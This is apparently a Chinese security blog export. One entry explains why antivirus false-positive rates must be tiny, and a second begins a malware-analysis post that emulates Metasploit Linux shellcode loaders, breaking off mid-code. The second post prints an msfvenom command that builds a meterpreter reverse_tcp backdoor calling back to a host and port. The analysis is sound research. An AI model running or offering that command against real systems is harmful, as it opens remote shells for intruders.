<p>因此，恶意软件检测具有困难的本质，并需要不断的工作和改进以保持有用。然而，防病毒程序因被视为过时的、不灵活的而被诟病。事实真的是这样吗？</p>
<h2 id="有人说他们可以做的更好"><a href="#有人说他们可以做的更好" class="headerlink" title="有人说他们可以做的更好"></a>有人说他们可以做的更好</h2><p>从媒体和广告商的常见声明中，人们得出的印象是防病毒产品故意使用过时的技术，并拒绝利用已经研究过的那些新的人工智能和其他技术来建立他们的系统。我们经常看到像”传统的防病毒已经死了”和”这个人工智能比防病毒更好”这样的文章吗？</p>
<p>这引出了一个问题：如果防病毒产品很容易就能更好，为什么它们不适应新技术呢？事实是：</p>
<ol>
<li>他们的确这么做了；</li>
<li>它们不能承受误报，并且与可以承受误报的应用程序进行了不公平的比较。</li>
</ol>
<h3 id="谬论1-防病毒产品使用过时的技术"><a href="#谬论1-防病毒产品使用过时的技术" class="headerlink" title="谬论1: 防病毒产品使用过时的技术"></a>谬论1: 防病毒产品使用过时的技术</h3><p>据媒体报道，防病毒产品搜索文件中的特征码以及将文件哈希值与阻止列表进行比较这样的技术进行检测恶意代码。这些检测机制仍然存在，但防病毒产品已经使用其他恶意软件检测技术至少20年了。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202302032033175.png" alt=""></p>
<p>2021 年的文章声称，防毒软件仅仅依赖于病毒签名来检测已知威胁。但是这是错误的：防毒软件不仅仅依赖于病毒签名，并且病毒签名不仅仅可以检测已知的恶意软件。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202302032036677.png" alt=""></p>
<p>有文章声称下一代的解决方案比当前的杀软更好。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202302032038303.png" alt=""></p>
<p>这篇文章错误地假设签名仅检测已知的恶意软件，可能是因为他将签名与基于模式的检测方法等效。</p>
<p>当我对恶意软件分析产生兴趣时，我读到的第一本关于这个主题的书是Péter Szőr的《The Art of Computer Virus Research and Defense》（2005年）[szor05]。这本现在已经有17年历史的书描述了远远超出模式签名和散列值的方法。Szőr提到了仿真，X射线扫描，内存扫描，基于算法的签名，行为阻止器和网络扫描[szor05]等。这些技术在过去几年中得到了改进，并开发了新的技术。</p>
<p>人工智能（AI）技术在Szőr的书中没有提到，但该技术已经有一些年头了。它们服务于许多目的，包括恶意软件聚类，客户端系统上的恶意软件检测以及自动签名创建。GDATA的DeepRay从2018年开始，我们当然不是第一家使用AI来增强检测能力的AV制造商。</p>
<p>尽管有了所有这些进展，这个谬论仍然存在。我可以想到两个原因：</p>
<p>首先，安全产品营销积极地强化它，以给人一种广告产品是新的、更好的印象。NextGen防病毒产品就是这样一个例子。他们声称拥有新的、不同的检测和保护技术，但他们使用的是与存在时间更长的防病毒产品相同的技术。反恶意软件和防病毒软件之间的人为区分也在尝试着同样的做法，给人一种（错误的）印象，即防病毒产品无法抵御恶意软件。</p>
<p>第二，其次，人们尝试检测VirusTotal，认为那里使用的扫描引擎反映了真实的防病毒产品。如果他们对检测到的文件进行了微小的更改，从而降低了VirusTotal的检测率，那么他们认为自己可以成功地规避防病毒产品。这种测试策略是有缺陷的，因为VirusTotal上的扫描引擎只支持真正产品所具有的一小部分功能，而且实际上大部分都局限于模式扫描和文件块列表，从而让人们对完整产品的实际工作方式产生错觉。VirusTotal的网站上也有说明（见下图）。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202302032053412.png" alt=""></p>
<h3 id="谬论2-5-的误报率是可用的"><a href="#谬论2-5-的误报率是可用的" class="headerlink" title="谬论2:  5%的误报率是可用的"></a>谬论2:  5%的误报率是可用的</h3><p>当我在2014年写我的硕士论文时，我开发了一种基于文件异常的恶意软件检测启发式方法。我的工作基于Ange Albertini的贡献，即发现和记录文件异常，他将这些文件异常收集在他的项目Corkami中。当时作为Avira的恶意软件分析师工作的Ange，得知我的工作后来参加了我在莱比锡的硕士论文答辩。当我问他，我的启发式方法的误报率是多少是可用的时，他的回答让我吃惊。他说，零。</p>
<p>“零”是一个糟糕的答案，因为一旦我试图使假阳性率接近于零，检测率就会急剧下降。误报率实际上从未达到零。我对我的测试使用了49,814个干净样本和103,275个恶意样本。图片在右侧显示了误报（十字形）和真阳性（黑色正方形）率的图表。例如，在8.81％的误报率下，真阳性检测率为98.47％。这意味着8.81％的干净文件被错误地认为是恶意软件，而1.53％的恶意软件不能被检测到。即使将误报率保持尽可能低，仍有0.17％的干净文件得到了错误的判决。这样带来了巨大的弊端，导致恶意文件的检出率降低37.80％。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202302032106621.png" alt=""></p>
<p>当时我并未意识到为什么误报率必须是零，当然，一定的错误率是可以接受的？防病毒产品毕竟不是完美的。每个人都听说过甚至可能遇到过防病毒产品的误报。现在我是一名恶意软件分析师，我知道了答案：是的，假阳性是防病毒产品的一部分，但可接受的假阳性率远低于你的想象。</p>
<p>当前的恶意软件检测研究论文通常对可接受的假阳性率有相同的误解。他们中的许多人认为，干净文件和恶意软件文件的数量大致相等，也就是说是平衡的。实际上，计算机系统很少看到任何恶意软件，但大部分时间都会处理干净的文件。例如：对于Windows 10 <em>C:\Windows</em>文件夹包含大约500000个文件。如果我们假设只有5%的假阳性率，检测技术将确定25000个文件为恶意文件。除非您准备好打赌，在从<em>C:/Windows</em>中删除25000个任意文件后，您的系统仍能正常工作，否则这是一个不可接受的数字。您准备下注多少文件？</p>
<p>这种对不平衡问题的误解有一个名字：<strong>基本利率谬误</strong>。这是如此普遍，以至于进行了几项研究以提高认识。Jan Brabec和Lukas Machlica总结道：“我们遇到了大量的近期论文，其中使用了不恰当的评估方法”和<em>“糟糕的做法可能会使结果严重偏向于不恰当的算法”</em>。研究《计算机安全中机器学习的注意事项》在十年中发表的30篇论文中检查了常见的陷阱。这些论文中有11篇受到了基本利率谬误的困扰。</p>
<p>然而，可以接受的误报率率到底是多少？Stefan Axelsson就侵检测的这场景下分析了这个问题。Axelsson表示<em>“限制入侵检测系统性能的因素不是将行为正确识别为入侵行为的能力，而是其抑制错误警报的能力”，并得出结论</em>“入侵检测系统每次事件的误报率必须低于1/100,000，即0.001%。误报率更高的解决方案不仅为负责安全的运维人员带来了更多的工作，而且还变成了“狼来了谎言”——没人再把它们当回事了。</p>
<p>一个可行的误报率对于能够自动响应入侵威胁的防病毒产品来说必须更低。与入侵检测系统相反，自动预防中的误报可以摧毁整个系统或中断生产流程。对于使用小于100,000个样本的干净样本集的研究工作，误报率实际上必须为零。</p>
<h2 id="防病毒产品是怎么做的"><a href="#防病毒产品是怎么做的" class="headerlink" title="防病毒产品是怎么做的"></a>防病毒产品是怎么做的</h2><p>现在，我们知道一个防病毒程序的误报率必须多么低才能保持可用，显然这就是为什么启发式检测不再那么简单。很多人可以想到启发式检测的思路，例如，为了检测勒索软件，只需要检查一次性重命名大量文件并因加密而提高熵值的程序。但是当这些启发式被实际应用时，你会发现有多少合法程序显示出类似的行为。以勒索软件启发式为例，例如，备份程序也做着相同的事情：批量重命名个人文件并通过压缩提高它们的熵值。</p>
<p>防病毒产品通过分层防御机制来解决这个问题，各种检测手段堆叠在一起以实现最佳覆盖。它们中的一些可能只能检测20％的样本，因为它们特定于某些类型的攻击或环境，例如，文件格式，行为或其他是先决条件的属性。但是，如果某些样本在其他层并没有被检测到，那么当前层依然会进行检测和处理。</p>
<p>大多数人可能都熟悉<a href="https://en.wikipedia.org/wiki/Swiss_cheese_model" target="_blank" rel="noopener">瑞士奶酪防御模型</a>，其中的含义在这里很有意义。</p>
<p>理解了瑞士奶酪防御模型就可以理解为什么误报比漏报要糟糕的多，未检测到的恶意软件可以最终被其他层检测到。因此，单个图层的低检测率没有关系，只要其他层填补了这个空缺。但对于误报，没有类似的层层网络。但是你可能会问 <strong>“白名单呢”？</strong>。</p>
<p>虽然白名单机制是一定存在，但是它必须被视为最后的手段，并谨慎使用，主要有如下原因：</p>
<ol>
<li>首先，白名单列表可能为恶意软件逃避杀毒软件检测敞开大门。如果程序的证书、关键字、行为或其他特征被用于允许列表，恶意软件也可以滥用它们。出于同样的原因，某些程序不能被加入白名单，例如，它们是合法和恶意文件都能使用的执行环境的一部分；或者因为它们只在某些上下文中是干净的。这类程序比比皆是，例如，远程访问工具在实际提供帮助时是可以的，但如果被攻击者静默安装，则不那么好。</li>
<li>第二，其次，合法程序每天都在演变和出现新版本或类似程序。因此，仅针对特定版本的白名单条目不是一个长期解决方案。为了调整易产生误报的检测启发式算法，几乎肯定要定期添加其他允许列表条目，这是一项维护量很大的工作。</li>
</ol>
<p>通常，预防层的误报就是整个产品的误报，相比之下，漏报可以随意高，只要恶意代码检测层的性能能够及时的覆盖掉新出现的恶意软件即可。</p>
<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><p>启发式恶意代码检测看起来非常简单，但实际上是很棘手的。虽然许多人认为高的恶意软件检出率是主要目标，但低误报率是检测启发式检测质量的最重要指标。误报率的影响常常由于<strong>基本利率谬误</strong>所被低估。</p>
<p>在杀软产品上，误报必须是可管理的，相应的容忍率肯定要低于0.001%。单个技术的误漏率不是那么重要，只要启发式检测覆盖了瑞士奶酪防御模型中的一些洞即可。</p>
<p>我希望检测技术研究能够专门关注难以检测的样本，并找到实际解决方案，而不是试图创造我们德国人称之为“会下蛋，会生产乳汁的绵羊”。永远不会有一种技术可以统治所有技术。</p>
<p>我也希望记者和安全影响者理解抗病毒技术的状态和检测研究的实际价值，以便他们停止加强这种误解。抗病毒营销也是一样，过时的检测技术的神话可能很好地诋毁竞争对手，但长期来看对抗病毒行业产生了不利影响。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[ange] Ange Albertini, <em>Corkami</em>, Google Code project, <a href="https://code.google.com/archive/p/corkami/" target="_blank" rel="noopener">https://code.google.com/archive/p/corkami/</a> now moved to <a href="https://github.com/corkami" target="_blank" rel="noopener">https://github.com/corkami</a></p>
<p>[arp20] Daniel Arp et al, 2020<em>, Dos and Don’ts of Machine Learning in Computer Security,</em> <a href="https://www.researchgate.net/publication/344757244_Dos_and_Don&#39;ts_of_Machine_Learning_in_Computer_Security" target="_blank" rel="noopener">https://www.researchgate.net/publication/344757244_Dos_and_Don&#39;ts_of_Machine_Learning_in_Computer_Security</a></p>
<p>[art1] <a href="https://securityboulevard.com/2021/09/why-antivirus-is-not-enough-the-sandbox-is-dead-turning-the-corner-with-malware-prevention" target="_blank" rel="noopener">https://securityboulevard.com/2021/09/why-antivirus-is-not-enough-the-sandbox-is-dead-turning-the-corner-with-malware-prevention</a></p>
<p>[art2] <a href="https://venturebeat.com/2021/02/22/antivirus-is-dead-the-rising-enterprise-security-threats-for-2021-and-how-to-protect-against-them/" target="_blank" rel="noopener">https://venturebeat.com/2021/02/22/antivirus-is-dead-the-rising-enterprise-security-threats-for-2021-and-how-to-protect-against-them/</a></p>
<p>[art3] <a href="https://slate.com/technology/2017/02/why-you-cant-depend-on-antivirus-software-anymore.html" target="_blank" rel="noopener">https://slate.com/technology/2017/02/why-you-cant-depend-on-antivirus-software-anymore.html</a></p>
<p>[axelsson00] Stefan Axelsson, 2000, <em>The Base-Rate Fallacy and the Difficulty of Intrusion Detection</em>, <a href="https://dl.acm.org/doi/pdf/10.1145/357830.357849" target="_blank" rel="noopener">https://dl.acm.org/doi/pdf/10.1145/357830.357849</a></p>
<p>[bramac18] Jan Brabec and Lukas Machlica, 2018, <em>Bad practices in evaluation methodology relevant to class-imbalanced problems</em>, <a href="https://arxiv.org/abs/1812.01388" target="_blank" rel="noopener">https://arxiv.org/abs/1812.01388</a></p>
<p>[cohen84] Fred Cohen, 1984, <em>Prevention of Computer Viruses</em>, <a href="https://web.eecs.umich.edu/~aprakash/eecs588/handouts/cohen-viruses.html" target="_blank" rel="noopener">https://web.eecs.umich.edu/~aprakash/eecs588/handouts/cohen-viruses.html</a></p>
<p>[hahn14] Karsten Philipp Boris Hahn (previously Katja Hahn), 2014, <em>Robust Static Analysis of Portable Executable Malware</em>, <a href="https://www.researchgate.net/publication/350722779_Robust_Static_Analysis_of_Portable_Executable_Malware" target="_blank" rel="noopener">https://www.researchgate.net/publication/350722779_Robust_Static_Analysis_of_Portable_Executable_Malware</a></p>
<p>[szor05] Péter Szőr, February 2005, <em>The Art of Computer Virus Research and Defense,</em> Addison Wesley Professional</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>malware</tag>
      </tags>
  </entry>
  <entry>
    <title>杀软的无奈-metasploit的shellcode loader分析(三)</title>
    <url>/2021/04/25/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-metasploit%E7%9A%84shellcode%E5%88%86%E6%9E%90(%E4%B8%89)/</url>
    <content><![CDATA[<blockquote>
<p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/242550" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242550</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要是通过编写一些自动化的工具来分析metepreter生成的linux平台的shellcode loader，以及解释一些常用的编码器的工作过程。</p>
<p><strong>本文使用的工具是 unicorn，官方版本没有执行SMC代码的能力(已经在修了)，推荐暂时使用个人patch版本<a href="https://github.com/wonderkun/unicorn" target="_blank" rel="noopener">https://github.com/wonderkun/unicorn</a></strong></p>
<a id="more"></a>

<h2 id="无编码器的metepreter-shellcode-loader"><a href="#无编码器的metepreter-shellcode-loader" class="headerlink" title="无编码器的metepreter shellcode loader"></a>无编码器的metepreter shellcode loader</h2><p>首先生成一个metepreter后门，然后用IDA分析一下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom  -p  linux/x64/meterpreter/reverse_tcp  LHOST=192.168.7.34 LPORT=4444  -f elf &gt; tese.elf</span><br></pre></td></tr></table></figure>

<p>ida看一下生成的代码如下：</p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-25-11-38-48.png" alt=""></p>
<p>ida虽然对一些syscall进行了注释，但是rax被动态赋值的时候调用syscall，IDA就无能为力了，所以接下来要基于unicorn写模拟执行工具，来进行分析。</p>
<h3 id="0x01-加载ELF文件"><a href="#0x01-加载ELF文件" class="headerlink" title="0x01 加载ELF文件"></a>0x01 加载ELF文件</h3><p>首先先来解析ELF文件，获取可执行的segment的代码，进行加载。这一步不一定有必要做，因为你可以直接模拟执行shellcode，也可以使用IDApython直接提取代码来分析。但是我还是希望能够直接分析ELF文件，并且不依赖于IDA的辅助，所以从最基础的部分开始做起。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ELF</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,path)</span>:</span></span><br><span class="line">		self.path = path</span><br><span class="line">		self.fd = open(self.path,<span class="string">"rb"</span>) </span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="comment"># 需要手工调用，否则会产生文件占用</span></span><br><span class="line">		<span class="keyword">if</span> self.fd:</span><br><span class="line">			self.fd.close()</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">getFileHeader</span><span class="params">(self)</span>:</span></span><br><span class="line">		elfhdr = &#123;&#125;</span><br><span class="line">		<span class="string">'''</span></span><br><span class="line"><span class="string">		#define EI_NIDENT       16</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		typedef struct &#123;</span></span><br><span class="line"><span class="string">				unsigned char   e_ident[EI_NIDENT]; </span></span><br><span class="line"><span class="string">				Elf32_Half      e_type;</span></span><br><span class="line"><span class="string">				Elf32_Half      e_machine;</span></span><br><span class="line"><span class="string">				Elf32_Word      e_version;</span></span><br><span class="line"><span class="string">				Elf32_Addr      e_entry;</span></span><br><span class="line"><span class="string">				Elf32_Off       e_phoff;</span></span><br><span class="line"><span class="string">				Elf32_Off       e_shoff;</span></span><br><span class="line"><span class="string">				Elf32_Word      e_flags;</span></span><br><span class="line"><span class="string">				Elf32_Half      e_ehsize;</span></span><br><span class="line"><span class="string">				Elf32_Half      e_phentsize;</span></span><br><span class="line"><span class="string">				Elf32_Half      e_phnum;</span></span><br><span class="line"><span class="string">				Elf32_Half      e_shentsize;</span></span><br><span class="line"><span class="string">				Elf32_Half      e_shnum;</span></span><br><span class="line"><span class="string">				Elf32_Half      e_shstrndx;</span></span><br><span class="line"><span class="string">		&#125; Elf32_Ehdr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		typedef struct &#123;</span></span><br><span class="line"><span class="string">				unsigned char   e_ident[EI_NIDENT]; </span></span><br><span class="line"><span class="string">				Elf64_Half      e_type;</span></span><br><span class="line"><span class="string">				Elf64_Half      e_machine;</span></span><br><span class="line"><span class="string">				Elf64_Word      e_version;</span></span><br><span class="line"><span class="string">				Elf64_Addr      e_entry;</span></span><br><span class="line"><span class="string">				Elf64_Off       e_phoff;</span></span><br><span class="line"><span class="string">				Elf64_Off       e_shoff;</span></span><br><span class="line"><span class="string">				Elf64_Word      e_flags;</span></span><br><span class="line"><span class="string">				Elf64_Half      e_ehsize;</span></span><br><span class="line"><span class="string">				Elf64_Half      e_phentsize;</span></span><br><span class="line"><span class="string">				Elf64_Half      e_phnum;</span></span><br><span class="line"><span class="string">				Elf64_Half      e_shentsize;</span></span><br><span class="line"><span class="string">				Elf64_Half      e_shnum;</span></span><br><span class="line"><span class="string">				Elf64_Half      e_shstrndx;</span></span><br><span class="line"><span class="string">		&#125; Elf64_Ehdr;</span></span><br><span class="line"><span class="string">		'''</span></span><br><span class="line">		</span><br><span class="line">		elfident = self.fd.read(<span class="number">16</span>)</span><br><span class="line">		<span class="keyword">if</span> len(elfident) !=<span class="number">16</span>:</span><br><span class="line">			<span class="keyword">return</span> &#123;&#125;</span><br><span class="line">			</span><br><span class="line">		<span class="comment"># print( [ ord(i) for i in elfident] )</span></span><br><span class="line"></span><br><span class="line">		magic = [ ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> elfident]</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> magic[<span class="number">4</span>] == <span class="number">1</span>:</span><br><span class="line">			<span class="comment"># ELF 32</span></span><br><span class="line">			packStr = <span class="string">"&lt;2H5I6H"</span></span><br><span class="line">			elfhdr[<span class="string">"mode"</span>] = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">elif</span> magic[<span class="number">4</span>] == <span class="number">2</span>:</span><br><span class="line">			<span class="comment"># ELF 64</span></span><br><span class="line">			packStr = <span class="string">"&lt;2HI3QI6H"</span></span><br><span class="line">			elfhdr[<span class="string">"mode"</span>] = <span class="number">64</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment"># Data</span></span><br><span class="line">			<span class="keyword">return</span> &#123;&#125;</span><br><span class="line">		temp = self.fd.read(struct.calcsize( packStr ))</span><br><span class="line">		temp = struct.unpack(packStr,temp)</span><br><span class="line"></span><br><span class="line">		elfhdr[<span class="string">'magic'</span>] = magic</span><br><span class="line">		elfhdr[<span class="string">'e_type'</span>]= temp[<span class="number">0</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_machine'</span>] = temp[<span class="number">1</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_version'</span>] = temp[<span class="number">2</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_entry'</span>] = temp[<span class="number">3</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_phoff'</span>] = temp[<span class="number">4</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_shoff'</span>] = temp[<span class="number">5</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_flags'</span>] = temp[<span class="number">6</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_ehsize'</span>] = temp[<span class="number">7</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_phentsize'</span>] = temp[<span class="number">8</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_phnum'</span>] = temp[<span class="number">9</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_shentsize'</span>] = temp[<span class="number">10</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_shnum'</span>] = temp[<span class="number">11</span>]</span><br><span class="line">		elfhdr[<span class="string">'e_shstrndx'</span>] = temp[<span class="number">12</span>]</span><br><span class="line">		<span class="keyword">return</span> elfhdr</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">hasNoSectionInfo</span><span class="params">(self,elfhdr )</span>:</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> elfhdr:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">		<span class="keyword">if</span> elfhdr[<span class="string">"e_shoff"</span>] == <span class="number">0</span> <span class="keyword">and</span> \</span><br><span class="line">			elfhdr[<span class="string">"e_shnum"</span>] == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># print(elfhdr["e_shoff"])</span></span><br><span class="line">	<span class="comment"># print( elfhdr["e_shnum"] )</span></span><br><span class="line">	<span class="comment"># print( elfhdr["e_shentsize"] )</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">readProgramHeader</span><span class="params">(self,elfhdr)</span>:</span></span><br><span class="line">		headerSize = elfhdr[<span class="string">"e_ehsize"</span>]</span><br><span class="line">		self.fd.seek(headerSize)</span><br><span class="line">		<span class="string">'''</span></span><br><span class="line"><span class="string">			typedef struct &#123;</span></span><br><span class="line"><span class="string">				Elf32_Word      p_type;</span></span><br><span class="line"><span class="string">				Elf32_Off       p_offset;</span></span><br><span class="line"><span class="string">				Elf32_Addr      p_vaddr;</span></span><br><span class="line"><span class="string">				Elf32_Addr      p_paddr;</span></span><br><span class="line"><span class="string">				Elf32_Word      p_filesz;</span></span><br><span class="line"><span class="string">				Elf32_Word      p_memsz;</span></span><br><span class="line"><span class="string">				Elf32_Word      p_flags;</span></span><br><span class="line"><span class="string">				Elf32_Word      p_align;</span></span><br><span class="line"><span class="string">			&#125; Elf32_Phdr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">			typedef struct &#123;</span></span><br><span class="line"><span class="string">				Elf64_Word      p_type;</span></span><br><span class="line"><span class="string">				Elf64_Word      p_flags;</span></span><br><span class="line"><span class="string">				Elf64_Off       p_offset;</span></span><br><span class="line"><span class="string">				Elf64_Addr      p_vaddr;</span></span><br><span class="line"><span class="string">				Elf64_Addr      p_paddr;</span></span><br><span class="line"><span class="string">				Elf64_Xword     p_filesz;</span></span><br><span class="line"><span class="string">				Elf64_Xword     p_memsz;</span></span><br><span class="line"><span class="string">				Elf64_Xword     p_align;</span></span><br><span class="line"><span class="string">			&#125; Elf64_Phdr;</span></span><br><span class="line"><span class="string">		'''</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> elfhdr[<span class="string">"mode"</span>] == <span class="number">32</span>:</span><br><span class="line">			packStr = <span class="string">"&lt;8I"</span></span><br><span class="line">		<span class="keyword">elif</span> elfhdr[<span class="string">"mode"</span>] == <span class="number">64</span>:</span><br><span class="line">			packStr = <span class="string">"&lt;2I6Q"</span></span><br><span class="line"></span><br><span class="line">		phentsize = elfhdr[<span class="string">"e_phentsize"</span>]</span><br><span class="line">		phnum = elfhdr[<span class="string">"e_phnum"</span>]</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> struct.calcsize( packStr ) != phentsize :</span><br><span class="line">			<span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">		<span class="keyword">assert</span>( phnum &gt;= <span class="number">1</span> )</span><br><span class="line"></span><br><span class="line">		phHeaders = []</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(phnum):</span><br><span class="line">			<span class="comment"># 循环读取所有的段表</span></span><br><span class="line">			phHeader = &#123;&#125;</span><br><span class="line">			temp = self.fd.read(struct.calcsize( packStr ))</span><br><span class="line">			<span class="keyword">if</span> struct.calcsize( packStr ) != len(temp):</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">			temp = struct.unpack(packStr,temp)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> elfhdr[<span class="string">"mode"</span>] == <span class="number">32</span>:</span><br><span class="line">				phHeader[<span class="string">"p_type"</span>] = temp[<span class="number">0</span>]</span><br><span class="line">				phHeader[<span class="string">"p_offset"</span>] = temp[<span class="number">1</span>]</span><br><span class="line">				phHeader[<span class="string">"p_vaddr"</span>] = temp[<span class="number">2</span>]</span><br><span class="line">				phHeader[<span class="string">"p_paddr"</span>] = temp[<span class="number">3</span>]</span><br><span class="line">				phHeader[<span class="string">"p_filesz"</span>] = temp[<span class="number">4</span>]</span><br><span class="line">				phHeader[<span class="string">"p_memsz"</span>] = temp[<span class="number">5</span>]</span><br><span class="line">				phHeader[<span class="string">"p_flags"</span>] = temp[<span class="number">6</span>]</span><br><span class="line">				phHeader[<span class="string">"p_align"</span>] = temp[<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">			<span class="keyword">elif</span> elfhdr[<span class="string">"mode"</span>] == <span class="number">64</span>:</span><br><span class="line">				phHeader[<span class="string">"p_type"</span>] = temp[<span class="number">0</span>]</span><br><span class="line">				phHeader[<span class="string">"p_flags"</span>] = temp[<span class="number">1</span>]</span><br><span class="line">				phHeader[<span class="string">"p_offset"</span>] = temp[<span class="number">2</span>]</span><br><span class="line">				phHeader[<span class="string">"p_vaddr"</span>] = temp[<span class="number">3</span>]</span><br><span class="line">				phHeader[<span class="string">"p_paddr"</span>] = temp[<span class="number">4</span>]</span><br><span class="line">				phHeader[<span class="string">"p_filesz"</span>] = temp[<span class="number">5</span>]</span><br><span class="line">				phHeader[<span class="string">"p_memsz"</span>] = temp[<span class="number">6</span>]</span><br><span class="line">				phHeader[<span class="string">"p_align"</span>] = temp[<span class="number">7</span>]</span><br><span class="line">			phHeaders.append( phHeader )</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> phHeaders</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">getFirstCode</span><span class="params">(self,elfhdr,phHeaders)</span>:</span></span><br><span class="line">		<span class="comment"># 读取第一个 包含入口地址 并且可加载，可执行的段的数据</span></span><br><span class="line">		entryPoint = elfhdr[<span class="string">"e_entry"</span>]</span><br><span class="line">		PT_LOAD = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">		PF_X = <span class="number">0x1</span> </span><br><span class="line">		PF_W = <span class="number">0x2</span></span><br><span class="line">		PF_R = <span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">		firstPh = <span class="literal">None</span></span><br><span class="line">		<span class="comment"># print(phHeaders)</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>  phHeader <span class="keyword">in</span> phHeaders:</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> ( entryPoint &gt;= phHeader[<span class="string">"p_vaddr"</span>] <span class="keyword">and</span> entryPoint &lt; (phHeader[<span class="string">"p_vaddr"</span>]+phHeader[<span class="string">"p_filesz"</span>]) ):</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> phHeader[<span class="string">"p_type"</span>] == PT_LOAD <span class="keyword">and</span>\</span><br><span class="line">				(phHeader[<span class="string">"p_flags"</span>] &amp; (PF_X)):</span><br><span class="line"></span><br><span class="line">				<span class="comment"># rwx</span></span><br><span class="line">				firstPh = phHeader</span><br><span class="line"></span><br><span class="line">		<span class="comment"># print(firstPh)</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> firstPh:</span><br><span class="line">			fileOff = entryPoint - firstPh[<span class="string">"p_vaddr"</span>] + phHeader[<span class="string">"p_offset"</span>]</span><br><span class="line">			size = phHeader[<span class="string">"p_filesz"</span>] - ( entryPoint - firstPh[<span class="string">"p_vaddr"</span>] )</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> fileOff &lt; <span class="number">0</span>  <span class="keyword">or</span> size &lt; <span class="number">0</span> :</span><br><span class="line">				<span class="comment"># invalid entry point</span></span><br><span class="line">				<span class="keyword">return</span> <span class="literal">None</span>,<span class="literal">None</span></span><br><span class="line"></span><br><span class="line">			self.fd.seek(fileOff)</span><br><span class="line">			imageBase = firstPh[<span class="string">"p_vaddr"</span>]</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> imageBase,self.fd.read( size )</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span>,<span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>然后从entryPoint开始进行模拟执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleEngine</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mode)</span>:</span></span><br><span class="line">		<span class="keyword">if</span> mode == <span class="number">32</span>:</span><br><span class="line">			cur_mode = CS_MODE_32</span><br><span class="line">		<span class="keyword">elif</span> mode == <span class="number">64</span>:</span><br><span class="line">			cur_mode = CS_MODE_64</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			cur_mode = CS_MODE_16</span><br><span class="line"></span><br><span class="line">		self.capmd = Cs(CS_ARCH_X86, cur_mode)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">disas_single</span><span 